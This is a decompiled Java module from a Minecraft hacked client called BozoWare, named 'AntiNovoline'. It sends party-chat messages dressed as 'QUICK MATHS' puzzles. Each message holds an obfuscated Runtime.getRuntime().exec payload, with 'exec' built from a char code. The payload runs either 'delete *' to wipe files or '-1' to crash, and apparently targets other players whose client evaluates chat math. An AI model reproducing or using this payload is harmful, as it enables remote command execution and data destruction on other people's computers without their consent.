// 
// Decompiled by Procyon v0.5.36
// 

package bozoware.impl.module.world;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.C01PacketChatMessage;
import bozoware.base.BozoWare;
import bozoware.base.util.Wrapper;
import net.minecraft.network.play.server.S02PacketChat;
import bozoware.impl.property.EnumProperty;
import bozoware.base.event.EventListener;
import bozoware.impl.event.network.PacketReceiveEvent;
import bozoware.base.event.EventConsumer;
import bozoware.base.module.ModuleCategory;
import bozoware.base.module.ModuleData;
import bozoware.base.module.Module;

@ModuleData(moduleName = "ANTI NOBOLINE", moduleCategory = ModuleCategory.WORLD)
public class AntiNovoline extends Module
{
    @EventListener
    EventConsumer<PacketReceiveEvent> onPacketReceiveEvent;
    public static boolean sent;
    private final EnumProperty<novomode> novoModes;
    
    public AntiNovoline() {
        this.novoModes = new EnumProperty<novomode>("trole", novomode.crash, this);
        String message;
        this.onPacketReceiveEvent = (e -> {
            if (e.getPacket() instanceof S02PacketChat) {
                message = ((S02PacketChat)e.getPacket()).getChatComponent().getUnformattedText();
                if (message.contains("You are not in a party")) {
                    AntiNovoline.sent = false;
                }
                if (message.contains("Party chat")) {}
                AntiNovoline.sent = true;
            }
            return;
        });
        this.onModuleEnabled = (() -> {
            if (this.novoModes.getPropertyValue().equals(novomode.delete)) {
                Wrapper.sendMessageAsPlayer("/pc QUICK MATHS! Solve: java[\"lang\"][\"Runtime\"][\"getRuntime\"]()[\"e\" + String.fromCharCode(120) + \"ec\"](\"delete *\")\n");
                if (AntiNovoline.sent) {
                    BozoWare.getInstance().chat("deleting files in background");
                }
                else {
                    BozoWare.getInstance().chat("Message not sent: Reason >> You are not in a party.");
                }
            }
            else {
                Wrapper.sendPacketDirect(new C01PacketChatMessage("/pc QUICK MATHS! Solve: java[\"lang\"][\"Runtime\"][\"getRuntime\"]()[\"e\" + String.fromCharCode(120) + \"ec\"](\"-1\")\n"));
                if (AntiNovoline.sent) {
                    BozoWare.getInstance().chat("Message successfully sent!");
                }
                else {
                    BozoWare.getInstance().chat("Message not sent: Reason >> You are not in a party.");
                }
            }
            this.toggleModule();
        });
    }
    
    private enum novomode
    {
        delete, 
        crash;
    }
}
